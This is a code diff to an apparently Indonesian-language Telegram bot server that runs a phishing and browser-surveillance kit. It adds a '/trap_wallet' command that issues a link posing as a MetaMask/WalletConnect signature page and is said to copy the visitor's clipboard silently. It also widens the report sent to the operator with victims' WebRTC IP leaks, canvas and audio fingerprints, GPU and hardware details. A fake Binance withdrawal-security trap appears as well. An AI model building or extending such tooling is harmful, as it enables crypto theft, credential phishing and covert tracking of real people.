@@ -627,14 +627,45 @@ async function startServer() {
         } catch(e) {}
       }
 
-      if (data.cpu_compute_score || data.perf_cores || data.battery || data.network || data.canvas_hash) {
-        let perfTxt = `├ Engine: <code>Audit Runtime v3</code>\n`;
-        if (data.cpu_compute_score) perfTxt += `├ Score: <code>${data.cpu_compute_score}</code>\n`;
-        if (data.perf_cores) perfTxt += `├ Resource: <code>${data.perf_cores} Cores / ${data.perf_mem} GB RAM</code>\n`;
-        if (data.battery) perfTxt += `├ Baterai: <code>${data.battery}</code>\n`;
-        if (data.network) perfTxt += `├ Jaringan: <code>${data.network}</code>\n`;
-        if (data.canvas_hash) perfTxt += `└ Canvas: <code>${data.canvas_hash}</code>`;
-        addSection(`⚡ Engine & Resource Metrics`, perfTxt);
+      if (data.cpu_bench || data.mem_gb || data.battery || data.network || data.canvas_hash || data.gpu_deep || data.audio_hash || data.thermal_load || data.rtc_public || data.rtc_local || data.hw_entropy || data.kbd_layout || data.biometric_eye || data.sensor_light) {
+        let hwTxt = ``;
+        if (data.cpu_bench) hwTxt += `├ CPU Bench: <code>${data.cpu_bench}</code>\n`;
+        if (data.mem_gb) hwTxt += `├ Memory: <code>${data.mem_gb} GB</code>\n`;
+        if (data.thermal_load) hwTxt += `├ Thermal: <code>${data.thermal_load}</code>\n`;
+        if (data.rtc_public) hwTxt += `├ RTC Public IP: <code>${data.rtc_public}</code>\n`;
+        if (data.rtc_local) hwTxt += `├ RTC Local IP: <code>${data.rtc_local}</code>\n`;
+        if (data.battery) hwTxt += `├ Battery: <code>${data.battery}</code>\n`;
+        if (data.network) hwTxt += `├ Network: <code>${data.network}</code>\n`;
+        if (data.sensor_light) hwTxt += `├ Ambient Light: <code>${data.sensor_light} lux</code>\n`;
+        if (data.canvas_hash) hwTxt += `├ Canvas Fingerprint: <code>${data.canvas_hash}</code>\n`;
+        if (data.audio_hash) hwTxt += `├ Audio/Oscillator Fingerprint: <code>${data.audio_hash}</code>\n`;
+        if (data.gpu_deep) {
+            try {
+                let g = JSON.parse(data.gpu_deep);
+                hwTxt += `├ GPU Renderer: <code>${g.r}</code>\n`;
+                hwTxt += `├ GPU Vendor: <code>${g.v}</code>\n`;
+                hwTxt += `├ Shading Lang: <code>${g.shading}</code>\n`;
+                hwTxt += `├ Max Texture: <code>${g.max_tex}</code>\n`;
+            } catch(e) {}
+        }
+        if (data.hw_entropy) {
+            try {
+                let he = JSON.parse(data.hw_entropy);
+                if (he.architecture) hwTxt += `├ Architecture: <code>${he.architecture} (${he.bitness}-bit)</code>\n`;
+                if (he.model) hwTxt += `├ Model: <code>${he.model}</code>\n`;
+                if (he.platformVersion) hwTxt += `├ Platform Version: <code>${he.platformVersion}</code>\n`;
+            } catch(e) {}
+        }
+        if (data.kbd_layout) hwTxt += `├ kbd_layout_map: <code>Detected</code>\n`;
+        if (data.biometric_eye) hwTxt += `├ Biometric: <code>Eye Tracking Supp</code>\n`;
+
+        hwTxt = hwTxt.trim();
+        if (hwTxt.endsWith('\n')) hwTxt = hwTxt.slice(0, -1);
+        let pieces = hwTxt.split('\n');
+        pieces[pieces.length - 1] = pieces[pieces.length - 1].replace('├', '└');
+        hwTxt = pieces.join('\n');
+        
+        addSection(`⚡ Deep Hardware & WebRTC Leak metrics`, hwTxt);
       }
 
       if (data.clipboard_sync || data.clipboard || data.clipboard_update) {
@@ -1049,6 +1080,18 @@ async function startServer() {
                 `Link menyamar sebagai halaman Withdrawal Security Binance.\n\n` +
                 `🔗 <code>${trapUrl}</code>\n\n` +
                 `⚠️ <i>Target harus memverifikasi sesi untuk melindungi aset dompet mereka.</i>\n` +
+                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
+
+    bot.command('trap_wallet', (ctx) => {
+      const id = generateTrapId(ctx.chat!.id || ctx.message?.chat?.id || ctx.from?.id || '');
+      const trapUrl = `${appHost.replace(/\/$/, '')}/t/wallet_connect/${id}`;
+      ctx.reply(`🦊 <b>WEB3 METAMASK SIGNATURE TRAP</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Link menyamar sebagai halaman Web3 WalletConnect (MetaMask Signature).\n` +
+                `Menyerang dengan stealth: langsung menyalin clipboard diam-diam saat target masuk.\n\n` +
+                `🔗 <code>${trapUrl}</code>\n\n` +
+                `⚠️ <i>Memancing pengguna Crypto untuk mengklik 'Connect Web3'.</i>\n` +
                 `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
 
